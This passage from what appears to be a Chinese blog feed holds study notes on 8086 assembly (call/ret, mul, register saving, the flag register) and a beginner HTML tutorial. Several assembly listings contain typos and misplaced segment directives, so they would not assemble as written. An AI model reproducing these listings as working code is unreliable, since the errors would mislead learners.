class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push IP<br>jmp 16位reg<br></code></pre></td></tr></table></figure><p>转移地址在内存中的call指令：</p><p>1.call word ptr 内存单元地址</p><p>等效汇编指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push IP<br>jmp word ptr 内存单元地址<br></code></pre></td></tr></table></figure><p>2.call dword ptr 内存单元地址</p><p>等效汇编指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push CS<br>push IP<br>jmp dword ptr 内存单元地址<br></code></pre></td></tr></table></figure><h2 id="call和ret的结合使用"><a href="#call和ret的结合使用" class="headerlink" title="call和ret的结合使用"></a>call和ret的结合使用</h2><p>范例一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment <br> start: mov ax,1<br>        mov cx,3<br>        call s<br>        mov bx,ax<br>        mov ax,4c00h<br>        int 21h<br>     s: add ax,ax<br>        loop s<br>        ret<br>code ends<br>end start<br></code></pre></td></tr></table></figure><p>范例二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br><br>stack segment <br>  db 8 dup (0)<br>  db 8 dup (0)<br>stack ends<br><br>code segment<br>  start:mov ax,stack<br>        mov ss,ax<br>        mov sp,16<br>        mov ax,1000<br>        call s<br>        mov ax.4c00h<br>        int 21h<br>      s:add ax,ax<br>        ret<br>code ends<br><br>end start<br></code></pre></td></tr></table></figure><h1 id="mul指令"><a href="#mul指令" class="headerlink" title="mul指令"></a>mul指令</h1><p>乘法指令：</p><p>注意事项：</p><p>1.相乘的两个数，要么是八位，要么是十六位。若为八位，一个默认放在AL中另一个放在八位reg中或内存字节单元中。</p><p>   如果是16位，一个默认放在AX中，另一个放在一个16位的寄存器中或内存字单元中</p><p>2.结果：8位乘法默认放在AX中；16位乘法高位默认在DX中存放，低位默认在AX中存放</p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mul reg<br>mul 内存单元#内存单元可由不同的寻址方式给出<br></code></pre></td></tr></table></figure><h1 id="参数和结果传递问题"><a href="#参数和结果传递问题" class="headerlink" title="参数和结果传递问题"></a>参数和结果传递问题</h1><p>范例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">code segemnt<br>  start:mov ax,data<br>        mov ds,ax<br>        mov si,0<br>        mov di,16               ;ds:si指向第一组word单元<br>                                ;ds:si指向第二组dword单元<br>        mov cx,8                <br>      s:mov bx,[si]<br>        call cube<br>        mov [di],ax<br>        mov [di].2,ax<br>        add si,2                ;ds:si指向下个word单元<br>        add di,2                ;ds:si指向下个dword单元<br>        loop s<br>        <br>        mov ax,4c00h<br>        int 21h<br>        <br>   cubu:mov ax,bx<br>        mul bx<br>        mul bx<br>        ret <br>        <br>code ends<br>end start<br></code></pre></td></tr></table></figure><h1 id="批量数据的传递"><a href="#批量数据的传递" class="headerlink" title="批量数据的传递"></a>批量数据的传递</h1><p>因为寄存器数量有限，对于参数调用和返回值存储的功能十分有限</p><p>这种时候我们选择将批量数据放到内存中，然后将他们所在的内存空间的首地址放在寄存器中，传递给需要的子程序，对于批量的数据返回结果，也可用同样的方法</p><p>对于所调用的子程序，需要知道：字符串的内容和长度</p><p>考虑到程序需要用到循环，且循环次数次数恰好就是字符串长度，出于方便考虑，可以将字符串的长度放到cx中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">capital: cs:code<br>  db &#x27;conversation&#x27;<br>data segment<br>  start:mov ax,data<br>        mov ds,ax<br>        mov si,0<br>        mov cx,12<br>        call capital<br>        mov ax,4c00h<br>        int 21h<br>        <br>capital:and byte ptr [si],11011111b<br>        inc si<br>        loop capital<br>        ret<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h1 id="寄存器冲突问题"><a href="#寄存器冲突问题" class="headerlink" title="寄存器冲突问题"></a>寄存器冲突问题</h1><p>范例:</p><p>##程序目的：将一个全是字母以0结尾的字符串全部转化成大写</p><p>程序说明：</p><p>#将一个全是字母，以0为结尾的字符串，转化为大写</p><p>#参数：ds：si指向字符串的首地址</p><p>#结果：没有返回值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">##完整程序<br>code segment <br><br>  start: mov ax,data<br>         mov ds,ax<br>         mov bx,0<br>         <br>         mov cx,4<br>      s: mov si,bx<br>         call capital<br>         add bx,5<br>         loop s<br>         <br>         mov ax,4c00h<br>         int 21h<br>         <br>capital: mov cl,[si]<br>         mov ch,0<br>         jcxz ok<br>         and byte ptr [si],11011111b<br>         inc si<br>         jmp short capital<br>     ok: ret<br>code ends<br>end start<br></code></pre></td></tr></table></figure><p>范例程序思想上完全正确，但细节上存在错误——子程序和主程序均使用cx进行循环控制</p><p>对于这种常见错误我们提出两种解决方式：</p><p>1.在编写调用子程序时，注意看看子程序有没有会用到产生冲突的寄存器，如果有，调用者使用别的寄存器；</p><p>2.在编写子程序时，不会使用产生冲突的寄存器。</p><p>但实际上上面两种方法均不太可能实现</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>在子程序的开始将子程序中所有用到的寄存器中的内容都保存起来，在子程序返回前恢复。可以用栈来保存寄存器内容。</p><p>编写程序的标准框架：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">子程序开始: 子程序中使用的寄存器入栈<br>          <br>          子程序内容<br>          <br>          子程序中使用的寄存器内容出栈<br>          <br>          返回(ret,retf)<br>          <br></code></pre></td></tr></table></figure><p>改进程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">capital:  push cx<br>          push si<br> change:  mov cl,[si]<br>          mov ch,0<br>          jcxz ok<br>          and byte ptr [si],11011111b<br>          inc si<br>          jmp short change<br>          <br>     ok:  pop si<br>          pop cx<br>          ret<br></code></pre></td></tr></table></figure><h1 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h1><p>CPU内部存在一种特殊的寄存器，具有以下三种作用：</p><p>1.用来存储相关命令的执行结果，</p><p>2.为CPU某些行为提供依据,</p><p>3.用来控制CPU的相关工作方式.</p><p>这种特殊的CPU叫做标志寄存器，8086CPU的标志寄存器有16位，简称flag寄存器。</p><p><img src="/../00000000/16.jpg"></p><h2 id="ZF标志："><a href="#ZF标志：" class="headerlink" title="ZF标志："></a>ZF标志：</h2><h6 id="flag的第六位是ZF，零标志位，执行相关命令后，检查结果是否为0。如果结果为0-那么zf-1-如果不为0，则zf-0"><a href="#flag的第六位是ZF，零标志位，执行相关命令后，检查结果是否为0。如果结果为0-那么zf-1-如果不为0，则zf-0" class="headerlink" title="flag的第六位是ZF，零标志位，执行相关命令后，检查结果是否为0。如果结果为0,那么zf&#x3D;1;如果不为0，则zf&#x3D;0"></a>flag的第六位是ZF，零标志位，执行相关命令后，检查结果是否为0。如果结果为0,那么zf&#x3D;1;如果不为0，则zf&#x3D;0</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,1<br>sub ax,1<br>#zf = 1<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2<br>sub ax,1<br>#zf = 0<br></code></pre></td></tr></table></figure><p>并不是所有运算都会影响到flag寄存器，影响到flag寄存器的大多数是运算指令，按照逻辑或算数运算；大多数对flag寄存器没有影响的指令都是传送指令</p><p>使用指令时要注意这个指令的全部功能，其中包括对flag寄存器的影响</p><h2 id="PF标志："><a href="#PF标志：" class="headerlink" title="PF标志："></a>PF标志：</h2><p>flag的第二位时PF，奇偶标志位，它记录相关指令后，其结果中所有bit位中1的个数是否为偶数。如果一的个数为偶数，pf&#x3D;1，如果为奇数，那么pf&#x3D;0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,1<br>add al,10<br>#ax的结果是00001011B，其中有三个1，pf = 0<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,1<br>or al,2<br>#ax的结果是00000011B，其中有两个1，pf = 1<br></code></pre></td></tr></table></figure><h2 id="SF标志"><a href="#SF标志" class="headerlink" title="SF标志"></a>SF标志</h2><p>flag的第七位是SF，符号标志位。它记录相关指令后结果是否为负。若结果为负，sf  &#x3D; 1，反之结果则为0</p><p>计算机中经常用补码表示一个有符号数据，计算机可以将一个数据看成有符号数，也可以将一个数据看成无符号数</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#00000001B  可以看作无符号数1，也可看做有符号数+1<br>#10000001B  可以看作无符号数129，也可看作有符号数-127<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>blog_learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HTML</title>
    <link href="/HTML/"/>
    <url>/HTML/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><p>文章内容大部分来自菜鸟教程，仅供入门参考</p><p>学习链接：<a href="https://www.runoob.com/html/html-intro.html">HTML 简介 | 菜鸟教程</a></p><p><strong>HTML的含义</strong>：HTML 是用来描述网页的一种语言，全称是<strong>H</strong>yper<strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage，它并不是一种编程语言，而是一种<strong>标记语言</strong>[标记语言就是一套标记标签]，HTML使用标记标签来描述网页，包含了标签和文本内容。<strong>HTML文档也被称为web页面</strong></p><p>自己再想例子有点麻烦，我直接应用原文的例子</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br> <br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我的第一个标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br> <br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我的第一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br> <br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/./../00000000/image-20250331105143480.png" alt="image-20250331105143480"></p><p>差不多看这两个就能懂了</p><p><strong>HTML标签</strong></p><ul><li>HTML 标签是由<em>尖括号</em>包围的关键词，比如 <html></li><li>HTML 标签通常是<em>成对出现</em>的</li><li>标签对中的第一个标签是<em>开始标签</em>，第二个标签是<em>结束标签</em></li><li>开始和结束标签也被称为<em>开放标签</em>和<em>闭合标签</em></li></ul><p>**web浏览器：**读取HTML文件将其作为网页显示</p><p><strong>HTML的可视化结构</strong></p><p><img src="/./../00000000/image-20250331105516939.png" alt="image-20250331105516939"></p><p><strong>申明  <!DOCTYPE html></strong> </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>doctype的声明是不区分大小写的，所以以下方式均可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTML"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">HTML</span>&gt;</span><br><br><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span><br><br><span class="hljs-meta">&lt;!Doctype <span class="hljs-keyword">Html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>**中文编码：**目前在大部分浏览器中，直接输出中文会出现中文乱码的情况，这时候我们就需要在头部将字符声明为 UTF-8 或 GBK</p><h3 id="一些相关辅助工具"><a href="#一些相关辅助工具" class="headerlink" title="一些相关辅助工具"></a>一些相关辅助工具</h3><p><strong>由于我目前一般都是用vscode，这里只介绍VScode上面的插件</strong></p><p><strong>1.Live Preview</strong></p><p><img src="/./../00000000/image-20250331110623047.png" alt="image-20250331110623047"></p><p>可以用来实时预览写的HTML代码</p><p><strong>2.Fitten Code</strong></p><p><img src="/./../00000000/image-20250331110806422.png" alt="image-20250331110806422"></p><p>ai助手，帮助更高效地编写代码，但是我觉得可能通义灵码也可能有类似地效果，它的功能还是比较完善的，也没什么好介绍，试了就会用，很简单。</p><h3 id="HTML基础"><a href="#HTML基础" class="headerlink" title="HTML基础"></a>HTML基础</h3><h5 id="简单理解一下上面的范例"><a href="#简单理解一下上面的范例" class="headerlink" title="简单理解一下上面的范例"></a>简单理解一下上面的范例</h5><h6 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h6><p>HTML 标题（Heading）是通过<h1> - <h6> 标签来定义的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>这是一个标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>这是一个标题<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>这是一个标题<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h6><p>HTML 段落是通过标签 <p> 来定义的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是另外一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h6><p>HTML 链接是通过标签 <a> 来定义的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.runoob.com&quot;</span>&gt;</span>这是一个链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在href属性中指定的链接的地址</p><h6 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h6><p>HTML 图像是通过标签 <img> 来定义的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/images/logo.png&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;258&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;39&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h5 id="HTML元素"><a href="#HTML元素" class="headerlink" title="HTML元素"></a>HTML元素</h5><ul><li>HTML 元素以<strong>开始标签</strong>起始</li><li>HTML 元素以<strong>结束标签</strong>终止</li><li><strong>元素的内容</strong>是开始标签与结束标签之间的内容</li><li>某些 HTML 元素具有<strong>空内容（empty content）</strong></li><li>空元素<strong>在开始标签中进行关闭</strong>（以开始标签的结束而结束）</li><li>大多数 HTML 元素可拥有<strong>属性</strong></li></ul><p>大多数 HTML 元素可以<strong>嵌套</strong>（HTML 元素可以包含其他 HTML 元素）。HTML 文档由相互嵌套的 HTML 元素构成。</p><p>[ 由于文章由md格式编写，所以为了显示出这个元素中间加了空格，但是实际上是没有空格的，自行辨别 ]</p><h6 id="p-元素"><a href="#p-元素" class="headerlink" title="&lt; p &gt; 元素:"></a>&lt; p &gt; 元素:</h6><p>定义了一个段</p><h6 id="body-元素："><a href="#body-元素：" class="headerlink" title="&lt; body &gt; 元素："></a>&lt; body &gt; 元素：</h6><p>定义了HTML的主体</p><h6 id="html-元素："><a href="#html-元素：" class="headerlink" title="&lt; html &gt; 元素："></a>&lt; html &gt; 元素：</h6><p>定义了整个 HTML 文档。</p><h6 id="HTML空元素："><a href="#HTML空元素：" class="headerlink" title="HTML空元素："></a>HTML空元素：</h6><p>没有内容的 HTML 元素被称为空元素。空元素是在开始标签中关闭的。</p><p>&lt; br &gt; 就是没有关闭标签的空元素</p><p>在 XHTML、XML 以及未来版本的 HTML 中，所有元素都必须被关闭。</p><p>在开始标签中添加斜杠，比如 &lt; br &#x2F;&gt;，是关闭空元素的正确方法，HTML、XHTML 和 XML 都接受这种方式。</p><p>即使 &lt; br &gt; 在所有浏览器中都是有效的，但使用 &lt; br &#x2F;&gt; 其实是更长远的保障。</p><p><strong>注意不要忘记结束标签，还是因为格式原因不便标注</strong></p><p><strong>HTML对大小写不敏感，但是万维网联盟（W3C）在 HTML 4 中推荐使用小写，而在未来 (X)HTML 版本中强制使用小写。</strong></p><h5 id="HTML属性"><a href="#HTML属性" class="headerlink" title="HTML属性"></a>HTML属性</h5><ul><li>HTML 元素可以设置<strong>属性</strong></li><li>属性可以在元素中添加<strong>附加信息</strong></li><li>属性一般描述于<strong>开始标签</strong></li><li>属性总是以名称&#x2F;值对的形式出现，<strong>比如：name&#x3D;”value”</strong>。</li></ul><p><strong>属性实例：</strong></p><p>HTML 链接由 &lt; a &gt; 标签定义。链接的地址在 <strong>href 属性</strong>中指定：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.runoob.com&quot;</span>&gt;</span>这是一个链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>**HTML属性常引用属性值：**一般都用双引号，不过单引号也问题不大，当属性值含有双引号或单引号时就用另一种包含以示区别，</p><p><strong>HTML元素参考表</strong></p><p><img src="/./../00000000/image-20250331203944524.png" alt="image-20250331203944524"></p><h6 id="全局属性："><a href="#全局属性：" class="headerlink" title="全局属性："></a>全局属性：</h6><p>全局属性是所有 HTML 元素都可以使用的属性。</p><p><strong>id</strong>：为元素指定唯一的标识符。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;header&quot;</span>&gt;</span>This is the header<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>class</strong>：为元素指定一个或多个类名，用于 CSS 或 JavaScript 选择。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text highlight&quot;</span>&gt;</span>This is a highlighted text.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>style</strong>：用于直接在元素上应用 CSS 样式。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: blue; font-size: 14px;&quot;</span>&gt;</span>This is a styled paragraph.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>title</strong>：为元素提供额外的提示信息，通常在鼠标悬停时显示。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">abbr</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;HyperText Markup Language&quot;</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">abbr</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>data-*</strong>：用于存储自定义数据，通常通过 JavaScript 访问。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">data-user-id</span>=<span class="hljs-string">&quot;12345&quot;</span>&gt;</span>User Info<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="特定元素的属性"><a href="#特定元素的属性" class="headerlink" title="特定元素的属性"></a>特定元素的属性</h6><p>某些属性仅适用于特定的 HTML 元素。</p><p><strong><code>href</code></strong>（用于 <code>&lt;a&gt;</code> 和 <code>&lt;link&gt;</code> 元素）：指定链接的目标 URL。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span>&gt;</span>Visit Example<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong><code>src</code></strong>（用于 <code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code> 等元素）：指定外部资源的 URL。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;An example image&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>alt（用于 <code>&lt;img&gt;</code> 元素）：为图像提供替代文本，当图像无法显示时显示。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;An example image&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong><code>type</code></strong>（用于 <code>&lt;input&gt;</code> 和 <code>&lt;button&gt;</code> 元素）：指定输入控件的类型。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Enter your name&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong><code>value</code></strong>（用于 <code>&lt;input&gt;</code>, <code>&lt;button&gt;</code>, <code>&lt;option&gt;</code> 等元素）：指定元素的初始值。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Default Value&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>disabled（用于表单元素）：禁用元素，使其不可交互。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">disabled</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong><code>checked</code></strong>（用于 <code>&lt;input type=&quot;checkbox&quot;&gt;</code> 和 <code>&lt;input type=&quot;radio&quot;&gt;</code>）：指定复选框或单选按钮是否被选中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">checked</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong><code>placeholder</code></strong>（用于 <code>&lt;input&gt;</code> 和 <code>&lt;textarea&gt;</code> 元素）：在输入框中显示提示文本。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 